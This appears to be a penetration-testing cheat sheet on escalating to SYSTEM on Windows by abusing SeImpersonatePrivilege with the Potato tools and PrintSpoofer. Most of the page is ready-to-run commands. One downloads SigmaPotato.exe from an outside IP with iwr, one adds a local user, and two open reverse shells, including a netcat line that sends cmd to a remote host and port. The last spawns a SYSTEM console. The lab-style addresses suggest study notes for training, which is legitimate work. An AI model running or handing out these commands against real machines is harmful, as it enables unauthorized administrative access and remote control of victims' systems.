# SeImpersonatePrivilege

Non-privileged users with assigned privileges, such as _SeImpersonatePrivilege_, can potentially abuse those privileges to perform privilege escalation attacks. _SeImpersonatePrivilege_ offers the possibility to leverage a token with another security context.

By default, Windows assigns this privilege to members of:

* local _Administrators_ group&#x20;
* _LOCAL SERVICE_, _NETWORK SERVICE_, and _SERVICE_ accounts.

Check privileges:&#x20;

```powershell
whoami /priv
```

* <mark style="color:red;">`SeImpersonatePrivilege - Impersonate a client after authentication - Enabled`</mark>&#x20;

Download Sigma Potato on windows machine:

{% embed url="https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe" %}

{% code overflow="wrap" %}
```powershell
iwr -uri http://192.168.48.3/SigmaPotato.exe -OutFile SigmaPotato.exe
```
{% endcode %}



Use Sigma Potato to add a new user:

```powershell
.\SigmaPotato "net user dave4 lab /add"
```

{% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" %}

Use Sigma Potato to get a rev shell:

```powershell
.\SigmaPotato.exe --revshell 10.128.16.60 1233
```

Upgrade shell:

```powershell
.\SigmaPotato.exe -i
```

Use GodPotato to get a rev shell:

{% code overflow="wrap" %}
```powershell
./GodPotato.exe -cmd "nc64.exe 192.168.45.197 4446 -e cmd"
```
{% endcode %}





Printspoofer:

If you have an **interactive** shell, you can create a new SYSTEM process in your current console.

```powershell
Get-Service Spooler
```

```
PrintSpoofer.exe -i -c cmd
```
